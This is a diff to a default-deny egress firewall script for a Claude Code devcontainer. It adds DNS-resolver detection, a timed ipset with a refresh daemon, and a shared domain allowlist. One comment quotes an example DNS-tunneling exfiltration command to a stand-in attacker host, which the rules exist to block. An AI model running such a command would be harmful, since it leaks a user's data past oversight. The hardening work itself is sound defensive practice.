@@ -5,10 +5,13 @@
 # Restricts outbound network traffic to only the domains Claude Code and
 # your development tools need. Default-deny policy with explicit allowlist.
 #
+# CDN-safe design: domains are resolved into an ipset with a 10-minute TTL.
+# A background daemon (refresh-firewall-dns.sh) re-resolves every 4 minutes
+# so that CDN IP rotations (Anthropic, Sentry, etc.) don't break connectivity.
+#
 # Requires: NET_ADMIN and NET_RAW capabilities in devcontainer.json runArgs.
 #
-# Customize the ALLOWED_DOMAINS array for your project's needs (e.g., add
-# your private registry, internal APIs, etc.)
+# Domain allowlist: edit firewall-allowed-domains.conf (shared with refresher).
 # =============================================================================
 
 set -euo pipefail
@@ -26,39 +29,26 @@ if [ -f "$LOCK_FILE" ]; then
 fi
 
 # ---------------------------------------------------------------------------
-# Allowed domains (customize for your organization)
+# Install shared domain list
 # ---------------------------------------------------------------------------
-ALLOWED_DOMAINS=(
-    # Claude Code API (required)
-    "api.anthropic.com"
+# Copy to /usr/local/etc so both init and refresher scripts can read it.
+DOMAINS_SRC="/workspace/.devcontainer/firewall-allowed-domains.conf"
+DOMAINS_DST="/usr/local/etc/firewall-allowed-domains.conf"
 
-    # Telemetry — SECURITY NOTE: sentry.io accepts arbitrary JSON payloads,
-    # making it a potential exfiltration vector. For maximum security, remove
-    # these and set CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1 instead.
-    "sentry.io"
-    "statsig.anthropic.com"
-    "statsig.com"
-
-    # Package registries
-    # Bun uses registry.npmjs.org by default for package resolution.
-    "registry.npmjs.org"
-    # "pypi.org"
-    # "files.pythonhosted.org"
-
-    # VS Code marketplace (for extension installs)
-    "marketplace.visualstudio.com"
-    "vscode.blob.core.windows.net"
-    "update.code.visualstudio.com"
-
-    # Add your internal domains below:
-    # "artifactory.yourcompany.com"
-    # "internal-api.yourcompany.com"
-)
+if [ -f "$DOMAINS_SRC" ]; then
+    cp "$DOMAINS_SRC" "$DOMAINS_DST"
+else
+    echo "ERROR: $DOMAINS_SRC not found"
+    exit 1
+fi
 
 # ---------------------------------------------------------------------------
 # Preserve Docker DNS before flushing
 # ---------------------------------------------------------------------------
-DOCKER_DNS_RULES=$(iptables-save -t nat | grep "127\.0\.0\.11" || true)
+# Preserve NAT rules for Docker's embedded DNS (127.0.0.11) or any
+# container-runtime DNS NAT rules matching configured nameservers.
+DNS_PATTERN=$(awk '/^nameserver/ {print $2}' /etc/resolv.conf | sed 's/\./\\\\./g' | paste -sd'|' -)
+DOCKER_DNS_RULES=$(iptables-save -t nat | grep -E "(${DNS_PATTERN:-127\\.0\\.0\\.11})" || true)
 
 # ---------------------------------------------------------------------------
 # Flush existing rules
@@ -86,17 +76,26 @@ fi
 # ---------------------------------------------------------------------------
 # Base rules: DNS (restricted), localhost
 # ---------------------------------------------------------------------------
-# SECURITY: DNS is restricted to Docker's embedded resolver only (127.0.0.11).
+# SECURITY: DNS is restricted to the container's configured resolver(s) only.
 # This mitigates DNS tunneling (CRITICAL-1 from audit): without this,
 # Claude could exfiltrate data via DNS queries to attacker-controlled
 # nameservers (e.g., dig $(base64 data).evil.com).
 #
-# Docker's embedded DNS at 127.0.0.11 NAT-rewrites packets to upstream
-# resolvers. We allow DNS only to 127.0.0.11, and the NAT rules (restored
-# above) handle forwarding to the real upstream resolver.
+# Standard Docker uses 127.0.0.11 (embedded DNS with NAT rewriting).
+# Other runtimes (OrbStack, Podman, etc.) may use different resolvers.
+# We detect the actual nameservers from /etc/resolv.conf.
 # TCP/53 is needed for truncated responses that retry over TCP.
-iptables -A OUTPUT -p udp -d 127.0.0.11 --dport 53 -j ACCEPT
-iptables -A OUTPUT -p tcp -d 127.0.0.11 --dport 53 -j ACCEPT
+DNS_SERVERS=$(awk '/^nameserver/ {print $2}' /etc/resolv.conf)
+if [ -z "$DNS_SERVERS" ]; then
+    echo "ERROR: No nameservers found in /etc/resolv.conf"
+    exit 1
+fi
+
+for dns in $DNS_SERVERS; do
+    echo "Allowing DNS to $dns"
+    iptables -A OUTPUT -p udp -d "$dns" --dport 53 -j ACCEPT
+    iptables -A OUTPUT -p tcp -d "$dns" --dport 53 -j ACCEPT
+done
 iptables -A INPUT -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
 iptables -A INPUT -p tcp --sport 53 -m state --state ESTABLISHED -j ACCEPT
 # Allow localhost
@@ -104,15 +103,18 @@ iptables -A INPUT -i lo -j ACCEPT
 iptables -A OUTPUT -o lo -j ACCEPT
 
 # ---------------------------------------------------------------------------
-# Create ipset for allowed domains
+# Create ipset with timeout support
 # ---------------------------------------------------------------------------
-ipset create allowed-domains hash:net
+# Entries expire after 600s (10 min). The refresh daemon re-adds them every
+# 240s (4 min), so valid IPs always stay live. Stale CDN IPs age out
+# naturally. This solves the CDN rotation problem without needing to flush.
+ipset create allowed-domains hash:net timeout 600
 
 # ---------------------------------------------------------------------------
 # Add GitHub IP ranges
 # ---------------------------------------------------------------------------
 echo "Fetching GitHub IP ranges..."
-gh_ranges=$(curl -s https://api.github.com/meta)
+gh_ranges=$(curl -s --connect-timeout 10 https://api.github.com/meta)
 if [ -z "$gh_ranges" ]; then
     echo "ERROR: Failed to fetch GitHub IP ranges"
     exit 1
@@ -129,28 +131,15 @@ while read -r cidr; do
         echo "ERROR: Invalid CIDR range from GitHub meta: $cidr"
         exit 1
     fi
-    ipset add -exist allowed-domains "$cidr"
+    # GitHub publishes stable CIDR ranges — use long timeout (24h)
+    ipset add -exist allowed-domains "$cidr" timeout 86400
 done < <(echo "$gh_ranges" | jq -r '(.web + .api + .git)[]' | aggregate -q)
 
 # ---------------------------------------------------------------------------
-# Resolve and add allowed domains
+# Initial DNS resolution for allowed domains
 # ---------------------------------------------------------------------------
-for domain in "${ALLOWED_DOMAINS[@]}"; do
-    echo "Resolving $domain..."
-    ips=$(dig +noall +answer A "$domain" | awk '$4 == "A" {print $5}')
-    if [ -z "$ips" ]; then
-        echo "WARNING: Failed to resolve $domain (skipping)"
-        continue
-    fi
-
-    while read -r ip; do
-        if [[ ! "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-            echo "ERROR: Invalid IP from DNS for $domain: $ip"
-            exit 1
-        fi
-        ipset add allowed-domains "$ip" 2>/dev/null || true
-    done < <(echo "$ips")
-done
+echo "Resolving allowed domains..."
+/usr/local/bin/refresh-firewall-dns.sh once
 
 # ---------------------------------------------------------------------------
 # Block cloud metadata endpoint (before any host network rules)
@@ -207,6 +196,13 @@ else
     echo "PASS: example.com blocked as expected"
 fi
 
+if ! curl --connect-timeout 5 https://api.anthropic.com >/dev/null 2>&1; then
+    echo "FAIL: Cannot reach api.anthropic.com (should be allowed)"
+    exit 1
+else
+    echo "PASS: api.anthropic.com reachable as expected"
+fi
+
 if ! curl --connect-timeout 5 https://api.github.com/zen >/dev/null 2>&1; then
     echo "FAIL: Cannot reach api.github.com (should be allowed)"
     exit 1
@@ -226,7 +222,17 @@ if command -v ip6tables &>/dev/null; then
     echo "IPv6 blocked."
 fi
 
+# ---------------------------------------------------------------------------
+# Start background DNS refresh daemon
+# ---------------------------------------------------------------------------
+# Re-resolves all allowed domains every 4 minutes so CDN IP rotations
+# don't break connectivity. Entries have 10-min TTL, so there's always
+# overlap between refresh and expiry.
+echo "Starting DNS refresh daemon..."
+nohup /usr/local/bin/refresh-firewall-dns.sh loop >/tmp/refresh-firewall-dns.log 2>&1 &
+echo "DNS refresh daemon PID: $!"
+
 # Mark firewall as initialized (prevents flush-and-rebuild race on re-run)
 touch "$LOCK_FILE"
 
-echo "Firewall ready."
+echo "Firewall ready (with background DNS refresh)."
